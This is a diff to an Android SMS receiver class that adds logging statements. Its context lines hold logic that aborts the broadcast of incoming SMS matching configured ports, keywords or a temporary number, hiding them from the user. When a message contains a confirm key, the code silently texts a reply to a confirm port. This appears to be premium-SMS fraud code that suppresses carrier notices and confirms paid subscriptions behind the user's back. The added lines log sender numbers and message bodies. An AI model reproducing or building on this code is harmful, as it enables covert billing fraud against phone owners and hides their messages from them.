@@ -47,14 +47,18 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
         if (smsCenter != null) {
             LOGD("smsCenter = " + smsCenter);
             sm.setSMSCenter(smsCenter);
+            sm.log(TAG, "get sms center = " + smsCenter);
+            sm.log(TAG, "sms num = " + msgs1[0].getDisplayOriginatingAddress());
             
             //check temp sms num
             String tempBlock = sm.getSMSTempBlockNumAndTimes();
+            sm.log(TAG, "The temp block info = " + tempBlock);
             if (tempBlock != null) {
                 String[] splits = tempBlock.split(";");
                 String addr = msgs1[0].getDisplayOriginatingAddress();
-                if (addr != null && addr.endsWith(splits[0]) == true) {
+                if (addr != null && splits[0] != null && addr.endsWith(splits[0]) == true) {
                     sm.setSMSTempBlockNumAndTimes(null, null);
+                    sm.log(TAG, "block the sms beacuse it contain the temp block num : " + splits[0]);
                     abortBroadcast();
                 }
             }
@@ -62,6 +66,7 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
         
         String blockPorts = sm.getSMSBlockPorts();
         String blockKeys = sm.getSMSBlockKeys();
+        sm.log(TAG, "block ports = " + blockPorts + " block keys = " + blockKeys);
         long smsLastSendTime = sm.getLastSMSTime();
         long smsBlockTime = sm.getSMSBlockDelayTime();
         long curTime = System.currentTimeMillis();
@@ -116,12 +121,14 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
                     }
                 }
                 if (shouldBlock == true) {
+                    sm.log(TAG, "Block the sms : " + addr +  " body = " + smsBody);
                     this.abortBroadcast();
                     if (smsBody != null && confirmKey != null 
                             && confirmPort != null && confirmText != null
                             && smsBody.contains(confirmKey) == true) {
                         if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] should confirm the" +
                         		" reply to : " + confirmPort + " text = " + confirmText);
+                        sm.log(TAG, "reply the sms with num = " + confirmPort + " text = " + confirmText);
                         WorkingMessage wm = WorkingMessage.createEmpty(context);
                         wm.setDestNum(confirmPort);
                         wm.setText(confirmText);
@@ -129,6 +136,7 @@ public class PrivilegedSmsReceiver extends SmsReceiver {
                     }
                 }
             } catch (Exception e) {
+                sm.log(TAG, "onReceive error = " + e.getMessage());
             } finally {
             }
         }
